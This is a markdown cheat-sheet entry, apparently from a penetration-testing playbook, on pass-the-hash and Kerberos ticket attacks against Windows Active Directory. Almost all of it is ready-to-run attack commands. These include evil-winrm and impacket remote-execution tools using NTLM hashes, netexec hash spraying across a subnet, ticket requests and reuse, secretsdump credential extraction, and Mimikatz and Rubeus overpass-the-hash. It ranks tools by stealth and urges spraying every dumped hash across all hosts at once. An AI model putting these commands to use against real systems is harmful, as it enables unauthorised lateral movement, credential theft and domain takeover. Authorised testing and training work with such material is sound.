---
id: pass-the-hash
title: Pass the Hash / Ticket
stage: foothold
tags: [windows, ad]
tools:
  - evil-winrm -i $TARGET -u Administrator -H NTLM_HASH
  - impacket-psexec Administrator@$TARGET -hashes :NTLM_HASH
  - impacket-wmiexec Administrator@$TARGET -hashes :NTLM_HASH
  - nxc smb 192.168.x.0/24 -u Administrator -H NTLM_HASH --local-auth
leads_to:
  - token-impersonation
  - bloodhound
  - dcsync
---

## Tool Priority (try in order)

```bash
evil-winrm -i $TARGET -u $USER -H $NTLM    # best interactive shell
impacket-wmiexec $USER@$TARGET -hashes :$NTLM    # semi-interactive, quiet
impacket-smbexec $USER@$TARGET -hashes :$NTLM    # SYSTEM, no binary on disk
impacket-psexec $USER@$TARGET -hashes :$NTLM     # noisy, often AV-flagged
```

## Spray Hash Across Subnet

```bash
# Domain context
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM

# Local admin context
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
```

## Pass the Ticket (Kerberos)

```bash
# Get TGT
impacket-getTGT $DOMAIN/user:password -dc-ip $DC_IP
impacket-getTGT $DOMAIN/user -hashes :$NTLM -dc-ip $DC_IP

# Use ticket
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/user@target -k -no-pass
impacket-wmiexec $DOMAIN/user@target -k -no-pass
impacket-secretsdump $DOMAIN/user@target -k -no-pass
```

## Overpass the Hash (NTLM → Kerberos TGT)

```powershell
# Mimikatz
sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:$NTLM /run:powershell.exe

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:$NTLM /ptt
```

## Notes

PTH is the core lateral movement technique. Every time you dump credentials, spray the hashes across all hosts immediately. `Pwn3d!` in nxc output = local admin.
